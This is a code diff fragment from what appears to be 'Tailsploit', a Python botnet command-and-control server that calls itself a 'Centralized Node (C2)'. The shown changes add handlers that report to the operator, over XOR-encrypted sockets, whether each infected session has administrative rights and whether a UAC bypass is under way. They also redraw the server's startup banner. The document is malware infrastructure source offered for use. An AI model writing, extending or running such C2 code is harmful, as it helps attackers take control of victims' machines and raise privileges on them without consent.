+                UserUAPXOR = self.handleXOREncryption(UserUAP.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
+                self.admin_socket.send(UserUAPXOR)
+            except Exception as e:
+                print(e)
+        elif decoded_data == "--FLAG:UAP=FALSE":
+            try:
+                UserUAP = f"{Fore.RED}[*]{Style.RESET_ALL} This session does not have administrative privileges. (UAC Bypass {Fore.RED}(-){Style.RESET_ALL})"
+                UserUAPXOR = self.handleXOREncryption(UserUAP.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
+                self.admin_socket.send(UserUAPXOR)
+            except Exception as e:
+                print(e)
+        elif decoded_data == "--FLAG:UAC_BYPASS_ATTEMPT":
+            try:
+                BypassUAC = f"{Fore.YELLOW}[*]{Style.RESET_ALL} Attempting to bypass UAC... (Target payload restarting, closing current TCP Session)"
+                BypassUACXOR = self.handleXOREncryption(BypassUAC.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
+                self.admin_socket.send(BypassUACXOR)
+            except Exception as e:
+                print(e)
+        elif decoded_data == "--FLAG:UAC_BYPASS_ALRDY":
+            try:
+                BypassUACAlrdy = f"{Fore.GREEN}[*]{Style.RESET_ALL} This session hass already administrative privilege."
+                BypassUACAlrdyXOR = self.handleXOREncryption(BypassUACAlrdy.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
+                self.admin_socket.send(BypassUACAlrdyXOR)
+            except Exception as e:
+                print(e)
+
         else:
             SendingDataXOR = self.handleXOREncryption(decoded_data.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
             self.admin_socket.send(SendingDataXOR)
@@ -873,7 +1112,7 @@ Server Session Timed out : {Fore.GREEN if self.TSF_SESSION_TIMEOUT else Fore.RED
                 continue
         
     def InitializingTailsploitServer(self):
-        start_time = time.time()  # Record the start time
+        start_time = time.time()
 
         print(f"[{Fore.GREEN}*{Style.RESET_ALL}] Setting up Tailsploit Server...")
         time.sleep(0.5)
@@ -881,8 +1120,8 @@ Server Session Timed out : {Fore.GREEN if self.TSF_SESSION_TIMEOUT else Fore.RED
             print(f"[{Fore.GREEN}*{Style.RESET_ALL}] Checking Port Provided Format...")
             time.sleep(0.1)
             print(f"[{Fore.GREEN}*{Style.RESET_ALL}] Checking IPv4 Provided Format...")
-            socket.inet_pton(socket.AF_INET, self.TSF_SERVER_IP)  # Check if valid IP address
-            if 0 < self.TSF_SERVER_PORT < 65536:  # Check if valid port number
+            socket.inet_pton(socket.AF_INET, self.TSF_SERVER_IP)
+            if 0 < self.TSF_SERVER_PORT < 65536: 
                 print(f"[{Fore.GREEN}*{Style.RESET_ALL}] Done, Port binded to Tailsploit Server")
                 time.sleep(0.1)
             else:
@@ -906,29 +1145,29 @@ Server Session Timed out : {Fore.GREEN if self.TSF_SESSION_TIMEOUT else Fore.RED
         print("")
         ctypes.windll.kernel32.SetConsoleTitleW("Tailsploit Botnet Server Handler")
         print("")
-        print(f"""                        
-               .*+      Tailsploit Framework Server (Enjoy Pentest !)
-             .+@@@      
-           =#@@@@@      ━━━━━━━     
-     .=*#%@@@@@@@+      
-   +@@@@@@@@@@@@+       [{Fore.GREEN}*{Style.RESET_ALL}] Tailsploit Server Status: {Fore.GREEN}Running{Style.RESET_ALL}
- :%@@@@@@@@@@@*.        
-.@@@@@@@@@#+-     -=    [{Fore.GREEN}*{Style.RESET_ALL}] Tailsploit Server Encryption Type: {Fore.YELLOW}XOR Encryption (Low-Level){Style.RESET_ALL}
-%@@@@#=:        -#@@    
-@@%-         .=@@@@@    [{Fore.GREEN}*{Style.RESET_ALL}] Tailsploit Server Information: {self.TSF_SERVER_IP} : {self.TSF_SERVER_PORT}
---      :=+#%@@@@@@*    
-     .*@@@@@@@@@@@%     [{Fore.GREEN}*{Style.RESET_ALL}] Tailsploit Botnet Type: {Fore.YELLOW}Centralized Node (Client-Server){Style.RESET_ALL}
-   .*@@@@@@@@@@@@+      
-   %@@@@@@@@@%+:        [{Fore.GREEN}*{Style.RESET_ALL}] Server Started In {Fore.GREEN}{elapsed_time_ms:.2f}{Style.RESET_ALL} ms
-  =@@@@%*=:.            
-  +@@#:                 For more information, read the Tailsploit documentation : \x1B[4mhttps://www.tailsploit.com\x1B[0m
-  -=
+        print(f"""    
+             ..........             
+         ..................          Tailsploit Framework Server (Enjoy Pentest !)
+      ..........    ..........      
+    ........            ........     For more information, read the Tailsploit documentation : \x1B[4mhttps://www.tailsploit.com\x1B[0m    
+    .....                 ......    
+    .....               ........     [{Fore.GREEN}*{Style.RESET_ALL}] Tailsploit Server Status: {Fore.GREEN}Running{Style.RESET_ALL}
+    .....            ...........    
+    .....         ..............     [{Fore.GREEN}*{Style.RESET_ALL}] Tailsploit Server Encryption Type: {Fore.YELLOW}XOR Encryption (Low-Level){Style.RESET_ALL}
+    .....         ..............    
+    .....         ..............     [{Fore.GREEN}*{Style.RESET_ALL}] Tailsploit Server Information: {self.TSF_SERVER_IP} : {self.TSF_SERVER_PORT}
+    ......        ..............    
+     ........     .............      [{Fore.GREEN}*{Style.RESET_ALL}] Tailsploit Botnet Type: {Fore.YELLOW}Centralized Node (C2){Style.RESET_ALL}
+       ......... ............       
+          ................           [{Fore.GREEN}*{Style.RESET_ALL}] Server Started In {Fore.GREEN}{elapsed_time_ms:.2f}{Style.RESET_ALL} ms
+             ..........             
+
 
 
 \x1B[4mTailsploit Server Log\x1B[0m >
 """)
 
-        data_thread = threading.Thread(target=self.TailsploitTrafficCommunicationData, name="Traffic Communication Data Handler [Tailsploit Server (XOR)]")
+        data_thread = threading.Thread(target=self.TailsploitTrafficCommunicationData, name="Traffic Communication Data Handler Tailsploit Server (XOR)")
         data_thread.start()
 
         while True:
@@ -936,7 +1175,7 @@ Server Session Timed out : {Fore.GREEN if self.TSF_SESSION_TIMEOUT else Fore.RED
 
             #print(f"[+] Accepted connection from: {client_addr}")
 
-            self.handle_client(client_socket, client_addr)
+            self.TailsploitBasicSessionHandler(client_socket, client_addr)
 
 if __name__ == "__main__":
     x = ServerShell()
